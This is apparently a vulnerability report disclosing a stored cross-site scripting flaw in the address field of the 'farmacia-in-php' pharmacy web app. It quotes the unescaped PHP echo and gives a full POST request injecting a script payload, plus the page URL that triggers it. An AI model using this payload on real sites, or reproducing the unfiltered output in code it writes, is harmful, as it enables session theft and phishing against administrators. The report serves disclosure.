# farmacia-in-php has Based Cross Site Scripting vulnerability in endereco  parameter in editar-cliente.php

## supplier 
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
editar-cliente.php and endereco parameter
## describe
There is an  Cross Site Scripting vulnerability in farmacia-in-php in editar-cliente.php,  Control parameter: endereco

Malicious attackers can use this cross-site scripting vulnerability to conduct phishing attacks and obtain administrator login information and permissions.

**Code analysis**

```
    <div class="row">
        <div class="form-group col-md-5">
            <label for="exampleInputEmail1">Endereco</label>
            <input type="text" required type="text" class="form-control" name="endereco"  value="<?php echo $cliente['endereco']?>">
        </div>
```

echo $cliente['endereco'] in no filter. 

## POC

![image-20241123121922535](https://github.com/user-attachments/assets/53ce4055-3575-4d1d-8379-0cc76477d9f8)

```
POST /adicionar-cliente.php/ HTTP/1.1
Host: farmacia
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------19936751914481096962863964736
Content-Length: 1234
Origin: http://farmacia
Connection: close
Referer: http://farmacia/adicionar-cliente.php/
Cookie: PHPSESSID=f2ibiaaffg3n4h8960vj2tagfv
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------19936751914481096962863964736
Content-Disposition: form-data; name="nome"

1
-----------------------------19936751914481096962863964736
Content-Disposition: form-data; name="cpf"

1
-----------------------------19936751914481096962863964736
Content-Disposition: form-data; name="dataNascimento"

2024-11-13
-----------------------------19936751914481096962863964736
Content-Disposition: form-data; name="endereco"

"><script>alert(1);</script>
-----------------------------19936751914481096962863964736
Content-Disposition: form-data; name="numero"

1
-----------------------------19936751914481096962863964736
Content-Disposition: form-data; name="bairro"

1
-----------------------------19936751914481096962863964736
Content-Disposition: form-data; name="telefone"

1
-----------------------------19936751914481096962863964736
Content-Disposition: form-data; name="celular"

1
-----------------------------19936751914481096962863964736
Content-Disposition: form-data; name="email"

1@outlook.com
-----------------------------19936751914481096962863964736
Content-Disposition: form-data; name="acao"


-----------------------------19936751914481096962863964736--

```

**Result**

![image-20241123122049660](https://github.com/user-attachments/assets/d7e04d64-1ed1-47d7-a8de-4eb448865309)

Visit this URL to trigger the cross-site scripting vulnerability.

```
http://farmacia/editar-cliente.php?id=4
```

![image-20241123122143213](https://github.com/user-attachments/assets/8e15c5da-6bc3-4ed6-b876-699aa1816b8e)